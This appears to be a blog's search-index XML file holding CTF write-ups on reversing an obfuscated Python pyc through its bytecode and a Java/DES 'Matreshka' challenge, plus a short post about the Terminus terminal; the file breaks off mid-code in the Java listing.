<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>网络信息安全专项赛_And_SUCTF</title>
      <link href="/2019/08/21/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%93%E9%A1%B9%E8%B5%9B-And-SuCtf/"/>
      <url>/2019/08/21/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%93%E9%A1%B9%E8%B5%9B-And-SuCtf/</url>
      
        <content type="html"><![CDATA[<p>这段时间玩了一下网络与信息安全领域专项赛和SUCTF，就稍微整合一下盲区。两场名次都是60+，虽然不像之前的签到选手了，但也离顶尖差很远很远。</p><a id="more"></a><p>[TOC]</p><h1 id="网络信息安全专项赛"><a href="#网络信息安全专项赛" class="headerlink" title="网络信息安全专项赛"></a>网络信息安全专项赛</h1><p>这个比赛的<code>challenges</code>相对来说比较简单，以下是我比较感兴趣的几题。</p><h2 id="Py交易"><a href="#Py交易" class="headerlink" title="Py交易"></a>Py交易</h2><p>参考<code>Nu1L wp</code>，以及</p><p><a href="https://blog.csdn.net/q1uTruth/article/details/99634952" target="_blank" rel="noopener">https://blog.csdn.net/q1uTruth/article/details/99634952</a></p><p><a href="https://www.jianshu.com/p/10e6bc633938" target="_blank" rel="noopener">https://www.jianshu.com/p/10e6bc633938</a></p><p>一个无法反编译的pyc文件，需要硬刚字节码。咱没有NU1L的自定义IDA PRO，只能找工具减少工作量：</p><p><a href="https://github.com/extremecoders-re/PjOrion-Deobfuscator" target="_blank" rel="noopener">https://github.com/extremecoders-re/PjOrion-Deobfuscator</a></p><p>根据此工具可生成svg格式的CFG图。</p><p>官方WP：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190821181518.png" alt=""></p><p>通过对<a href="https://github.com/python/cpython" target="_blank" rel="noopener">cpython</a>源码的实现进行理解，对于<code>PjOrion-Deobfuscator</code>提取出来的CFG图，可以开始硬刚上面的逻辑了：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190821205232.png" alt=""></p><p>跟着CFG图走一遍可以知道开始是四个列表赋值：</p><pre class=" language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">13433</span><span class="token punctuation">,</span> <span class="token number">4747</span><span class="token punctuation">,</span> <span class="token number">17752</span><span class="token punctuation">,</span> <span class="token number">33060</span><span class="token punctuation">,</span> <span class="token number">31051</span><span class="token punctuation">,</span> <span class="token number">48809</span><span class="token punctuation">,</span> <span class="token number">29988</span><span class="token punctuation">,</span> <span class="token number">6421</span><span class="token punctuation">,</span> <span class="token number">20021</span><span class="token punctuation">,</span><span class="token number">38888</span><span class="token punctuation">,</span> <span class="token number">24844</span><span class="token punctuation">,</span> <span class="token number">20706</span><span class="token punctuation">,</span> <span class="token number">11713</span><span class="token punctuation">,</span> <span class="token number">34938</span><span class="token punctuation">,</span> <span class="token number">12865</span><span class="token punctuation">,</span> <span class="token number">6085</span><span class="token punctuation">,</span> <span class="token number">37391</span><span class="token punctuation">,</span> <span class="token number">32840</span><span class="token punctuation">,</span> <span class="token number">31964</span><span class="token punctuation">,</span> <span class="token number">27194</span><span class="token punctuation">,</span><span class="token number">8701</span><span class="token punctuation">,</span> <span class="token number">48142</span><span class="token punctuation">,</span> <span class="token number">27066</span><span class="token punctuation">,</span> <span class="token number">28626</span><span class="token punctuation">,</span> <span class="token number">37431</span><span class="token punctuation">,</span> <span class="token number">39142</span><span class="token punctuation">,</span> <span class="token number">46795</span><span class="token punctuation">,</span> <span class="token number">21771</span><span class="token punctuation">,</span> <span class="token number">44280</span><span class="token punctuation">,</span> <span class="token number">40628</span><span class="token punctuation">,</span> <span class="token number">35013</span><span class="token punctuation">,</span><span class="token number">18583</span><span class="token punctuation">,</span> <span class="token number">5418</span><span class="token punctuation">,</span> <span class="token number">4347</span><span class="token punctuation">,</span> <span class="token number">43929</span><span class="token punctuation">,</span> <span class="token number">9934</span><span class="token punctuation">,</span> <span class="token number">46892</span><span class="token punctuation">,</span> <span class="token number">19868</span><span class="token punctuation">]</span>b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">13711</span><span class="token punctuation">,</span> <span class="token number">7074</span><span class="token punctuation">,</span> <span class="token number">79833</span><span class="token punctuation">,</span> <span class="token number">42654</span><span class="token punctuation">,</span> <span class="token number">23241</span><span class="token punctuation">,</span> <span class="token number">41412</span><span class="token punctuation">,</span> <span class="token number">61795</span><span class="token punctuation">,</span> <span class="token number">6373</span><span class="token punctuation">,</span> <span class="token number">19304</span><span class="token punctuation">,</span><span class="token number">1363</span><span class="token punctuation">,</span> <span class="token number">1682</span><span class="token punctuation">,</span> <span class="token number">66279</span><span class="token punctuation">,</span> <span class="token number">76134</span><span class="token punctuation">,</span> <span class="token number">60748</span><span class="token punctuation">,</span> <span class="token number">10355</span><span class="token punctuation">,</span> <span class="token number">63484</span><span class="token punctuation">,</span> <span class="token number">30491</span><span class="token punctuation">,</span> <span class="token number">34005</span><span class="token punctuation">,</span> <span class="token number">51393</span><span class="token punctuation">,</span> <span class="token number">38029</span><span class="token punctuation">,</span><span class="token number">7241</span><span class="token punctuation">,</span> <span class="token number">4998</span><span class="token punctuation">,</span> <span class="token number">18562</span><span class="token punctuation">,</span> <span class="token number">16935</span><span class="token punctuation">,</span> <span class="token number">66677</span><span class="token punctuation">,</span> <span class="token number">51321</span><span class="token punctuation">,</span> <span class="token number">13771</span><span class="token punctuation">,</span> <span class="token number">49108</span><span class="token punctuation">,</span> <span class="token number">52166</span><span class="token punctuation">,</span> <span class="token number">8851</span><span class="token punctuation">,</span> <span class="token number">16900</span><span class="token punctuation">,</span><span class="token number">31682</span><span class="token punctuation">,</span> <span class="token number">16684</span><span class="token punctuation">,</span> <span class="token number">12046</span><span class="token punctuation">,</span> <span class="token number">16764</span><span class="token punctuation">,</span> <span class="token number">64315</span><span class="token punctuation">,</span> <span class="token number">76742</span><span class="token punctuation">,</span> <span class="token number">14022</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">832832835</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">924053193</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">307134635</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">527578092</span><span class="token punctuation">,</span> <span class="token number">998625960</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">715102211</span><span class="token punctuation">,</span> <span class="token number">3572182</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">963194083</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">475718185</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">361574731</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">678171563</span><span class="token punctuation">,</span><span class="token number">107566155</span><span class="token punctuation">,</span> <span class="token number">608670527</span><span class="token punctuation">,</span> <span class="token number">254218946</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">81206308</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">284228457</span><span class="token punctuation">,</span> <span class="token number">373369420</span><span class="token punctuation">,</span><span class="token number">659110852</span><span class="token punctuation">,</span> <span class="token number">165298084</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">389004184</span><span class="token punctuation">,</span> <span class="token number">893094421</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">868933443</span><span class="token punctuation">,</span> <span class="token number">44838205</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">98551062</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">59800920</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">575871298</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">748337118</span><span class="token punctuation">,</span> <span class="token number">696390966</span><span class="token punctuation">,</span> <span class="token number">427210246</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">266607884</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">555200820</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">594235119</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">233255094</span><span class="token punctuation">,</span> <span class="token number">229291711</span><span class="token punctuation">,</span> <span class="token number">711922719</span><span class="token punctuation">,</span><span class="token number">14476464</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">783373820</span><span class="token punctuation">,</span> <span class="token number">892608580</span><span class="token punctuation">]</span>e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">973988289</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">867920193</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">132362266</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">172451190</span><span class="token punctuation">,</span> <span class="token number">1471255182</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">242282199</span><span class="token punctuation">,</span> <span class="token number">321870424</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">897049789</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">428663209</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">256350703</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">613466537</span><span class="token punctuation">,</span><span class="token number">321254055</span><span class="token punctuation">,</span> <span class="token number">641759727</span><span class="token punctuation">,</span> <span class="token number">344601346</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">40281788</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">217030057</span><span class="token punctuation">,</span> <span class="token number">476060216</span><span class="token punctuation">,</span><span class="token number">767746297</span><span class="token punctuation">,</span> <span class="token number">503093626</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">102198850</span><span class="token punctuation">,</span> <span class="token number">984358207</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">415480559</span><span class="token punctuation">,</span> <span class="token number">322813233</span><span class="token punctuation">,</span><span class="token number">178032672</span><span class="token punctuation">,</span> <span class="token number">48876640</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">467362638</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">260077296</span><span class="token punctuation">,</span> <span class="token number">923436845</span><span class="token punctuation">,</span> <span class="token number">536082660</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">138702820</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">210365307</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">397666023</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">215329942</span><span class="token punctuation">,</span> <span class="token number">274852104</span><span class="token punctuation">,</span> <span class="token number">818217684</span><span class="token punctuation">,</span><span class="token number">41479433</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">632022956</span><span class="token punctuation">,</span> <span class="token number">1204798830</span><span class="token punctuation">]</span></code></pre><p>建立列表之后，比较d和e，如果相等则调用p_s函数对象，不相等则调用p_f函数对象，在我们用marshl得到的信息中可以知道p_s和p_f的逻辑，在此题中p_s和p_f只是两个打印的函数而已。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190822110511.png" alt=""></p><p>通过分析得到d和e的关系：</p><pre class=" language-py"><code class="language-py">d.append(a[i]*data[i]*data[i] + b[i]*data[i])</code></pre><p>可以拟以下函数，其中x中为随便赋的值，然后通过dis模块打印字节码，以便将逻辑看的更为清晰，<code>本题要求的即为flag==&gt;x[]</code>：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190822140847.png" alt=""></p><p><code>import dis;dis.dis(get):</code></p><pre class=" language-python"><code class="language-python">            <span class="token number">597</span> STORE_FAST               <span class="token number">4</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token number">25</span>         <span class="token number">600</span> BUILD_LIST               <span class="token number">0</span>            <span class="token number">603</span> STORE_FAST               <span class="token number">5</span> <span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token number">26</span>         <span class="token number">606</span> SETUP_LOOP              <span class="token number">77</span> <span class="token punctuation">(</span>to <span class="token number">686</span><span class="token punctuation">)</span>            <span class="token number">609</span> LOAD_GLOBAL              <span class="token number">0</span> <span class="token punctuation">(</span>range<span class="token punctuation">)</span>            <span class="token number">612</span> LOAD_CONST             <span class="token number">191</span> <span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span>            <span class="token number">615</span> CALL_FUNCTION            <span class="token number">1</span>            <span class="token number">618</span> GET_ITER                    <span class="token operator">>></span>  <span class="token number">619</span> FOR_ITER                <span class="token number">63</span> <span class="token punctuation">(</span>to <span class="token number">685</span><span class="token punctuation">)</span>            <span class="token number">622</span> STORE_FAST               <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token number">27</span>         <span class="token number">625</span> LOAD_FAST                <span class="token number">5</span> <span class="token punctuation">(</span>d<span class="token punctuation">)</span>            <span class="token number">628</span> LOAD_ATTR                <span class="token number">1</span> <span class="token punctuation">(</span>append<span class="token punctuation">)</span>            <span class="token number">631</span> LOAD_FAST                <span class="token number">0</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span>            <span class="token number">634</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">637</span> BINARY_SUBSCR                   <span class="token number">638</span> LOAD_FAST                <span class="token number">4</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span>            <span class="token number">641</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">644</span> BINARY_SUBSCR                   <span class="token number">645</span> BINARY_MULTIPLY                 <span class="token number">646</span> LOAD_FAST                <span class="token number">4</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span>            <span class="token number">649</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">652</span> BINARY_SUBSCR                   <span class="token number">653</span> BINARY_MULTIPLY                 <span class="token number">654</span> LOAD_FAST                <span class="token number">1</span> <span class="token punctuation">(</span>b<span class="token punctuation">)</span>            <span class="token number">657</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">660</span> BINARY_SUBSCR                   <span class="token number">661</span> LOAD_FAST                <span class="token number">4</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span>            <span class="token number">664</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">667</span> BINARY_SUBSCR                   <span class="token number">668</span> BINARY_MULTIPLY                 <span class="token number">669</span> BINARY_ADD                      <span class="token number">670</span> LOAD_FAST                <span class="token number">2</span> <span class="token punctuation">(</span>c<span class="token punctuation">)</span>            <span class="token number">673</span> LOAD_FAST                <span class="token number">6</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">676</span> BINARY_SUBSCR                   <span class="token number">677</span> BINARY_ADD                      <span class="token number">678</span> CALL_FUNCTION            <span class="token number">1</span>            <span class="token number">681</span> POP_TOP                         <span class="token number">682</span> JUMP_ABSOLUTE          <span class="token number">619</span>        <span class="token operator">>></span>  <span class="token number">685</span> POP_BLOCK           </code></pre><p>可以看到与CFG图中的逻辑基本一致，只是少了很多不必要的跳转，此题基本到此结束。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190822143309.png" alt=""></p><h1 id="SUCTF"><a href="#SUCTF" class="headerlink" title="SUCTF"></a>SUCTF</h1><h2 id="guess-game"><a href="#guess-game" class="headerlink" title="guess_game"></a>guess_game</h2><p>此题是一个pickle反序列化的题目，虽然有思路，但是苦于不知道如何手工构造payload。</p><p>看wp后：</p><p><a href="https://github.com/rmb122/suctf2019_guess_game/tree/master/writeup" target="_blank" rel="noopener">https://github.com/rmb122/suctf2019_guess_game/tree/master/writeup</a></p><p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190822171000.png" class="lazyload"></p><p>从底层去理解一门语言真的tql，orz…😄</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Write_up </tag>
            
            <tag> bytecode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Awesome_Terminal</title>
      <link href="/2019/07/23/Awesome-Terminal/"/>
      <url>/2019/07/23/Awesome-Terminal/</url>
      
        <content type="html"><![CDATA[<p>This page is to show a good terminal named “Terminus”😎…</p><a id="more"></a><h1 id="Terminus"><a href="#Terminus" class="headerlink" title="Terminus"></a>Terminus</h1><p>It is an open source project…Until now already possess over ten thousands stars…</p><p>Here is a flyer page:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190723183221.png" alt=""></p><p>And mine look as follow:</p><hr><p><code>Home page</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190723183348.png" alt=""></p><p><code>SSH page</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190723183525.png" alt=""></p><p>It is really awesome! As you can see😄.</p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Cybrics_Matreshka_Reverse</title>
      <link href="/2019/07/22/Cybrics-Matreshka-Reverse/"/>
      <url>/2019/07/22/Cybrics-Matreshka-Reverse/</url>
      
        <content type="html"><![CDATA[<p>I try to play the Cybrics CTF yesterday😀…And the truth tell me that how suck i am… Btw…The challenges of Cybrics is very interesting and fresh.</p><a id="more"></a><h1 id="Cybrics-Matreshka-Reverse"><a href="#Cybrics-Matreshka-Reverse" class="headerlink" title="Cybrics_Matreshka_Reverse"></a>Cybrics_Matreshka_Reverse</h1><blockquote><p>CyBRICS is a computer security competition (CTF) organized in a cross-university effort by BRICS countries academia.</p><p>The event is organized by CyBRICS coordinating universities: <a href="https://en.itmo.ru/en/" target="_blank" rel="noopener">ITMO University</a> (RU), <a href="http://en.scu.edu.cn/" target="_blank" rel="noopener">SiChuan University</a> (CN), <a href="https://www.nitw.ac.in/" target="_blank" rel="noopener">NIT Warangal</a> (IN), <a href="http://www.iitkgp.ac.in/" target="_blank" rel="noopener">IIT Kharagpur</a> (IN), <a href="https://www.wits.ac.za/" target="_blank" rel="noopener">Wits University</a> (ZA), <a href="https://www.tut.ac.za/" target="_blank" rel="noopener">Tshwane University of Technology</a> (ZA).</p><p>The competition is made and run by <a href="https://vk.com/spbctf" target="_blank" rel="noopener">SPbCTF</a> meetups crew (members of CTF teams LC↯BC, SiBears, PeterPEN, Yozik).</p></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722151354.png" alt=""></p><h2 id="Challenge-Matreshka"><a href="#Challenge-Matreshka" class="headerlink" title="Challenge_Matreshka"></a>Challenge_Matreshka</h2><p>Although it is easy for most individuals, i think it’s valuable.</p><p>appendix: <code>Code2.class</code> and <code>data2.bin</code></p><h2 id="Step1-Java-analysis"><a href="#Step1-Java-analysis" class="headerlink" title="Step1: Java analysis"></a>Step1: Java analysis</h2><p>You can get the source code from Code2.class by the <code>jd-gui</code> or other tools like it.</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>PrintStream<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>Cipher<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>SecretKey<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>SecretKeyFactory<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span>DESKeySpec<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Code2</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfByte<span class="token punctuation">,</span> String paramString<span class="token punctuation">)</span>    <span class="token keyword">throws</span> Exception  <span class="token punctuation">{</span>    SecretKeyFactory localSecretKeyFactory <span class="token operator">=</span> SecretKeyFactory<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> paramString<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DESKeySpec localDESKeySpec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DESKeySpec</span><span class="token punctuation">(</span>arrayOfByte1<span class="token punctuation">)</span><span class="token punctuation">;</span>    SecretKey localSecretKey <span class="token operator">=</span> localSecretKeyFactory<span class="token punctuation">.</span><span class="token function">generateSecret</span><span class="token punctuation">(</span>localDESKeySpec<span class="token punctuation">)</span><span class="token punctuation">;</span>    Cipher localCipher <span class="token operator">=</span> Cipher<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localCipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> localSecretKey<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> localCipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>paramArrayOfByte<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> arrayOfByte2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfByte<span class="token punctuation">,</span> String paramString<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    SecretKeyFactory localSecretKeyFactory <span class="token operator">=</span> SecretKeyFactory<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> paramString<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DESKeySpec localDESKeySpec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DESKeySpec</span><span class="token punctuation">(</span>arrayOfByte1<span class="token punctuation">)</span><span class="token punctuation">;</span>    SecretKey localSecretKey <span class="token operator">=</span> localSecretKeyFactory<span class="token punctuation">.</span><span class="token function">generateSecret</span><span class="token punctuation">(</span>localDESKeySpec<span class="token punctuation">)</span><span class="token punctuation">;</span>    Cipher localCipher <span class="token operator">=</span> Cipher<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localCipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> localSecretKey<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> localCipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>paramArrayOfByte<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> arrayOfByte2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfString<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    String str <span class="token operator">=</span> <span class="token string">"matreha!"</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> <span class="token function">encode</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrayOfByte2<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>arrayOfByte2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> arrayOfByte1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    File localFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileInputStream localFileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>localFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>localFile<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte4 <span class="token operator">=</span> <span class="token function">decode</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">,</span> System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileOutputStream localFileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"stage2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>arrayOfByte4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arrayOfByte4<span class="token 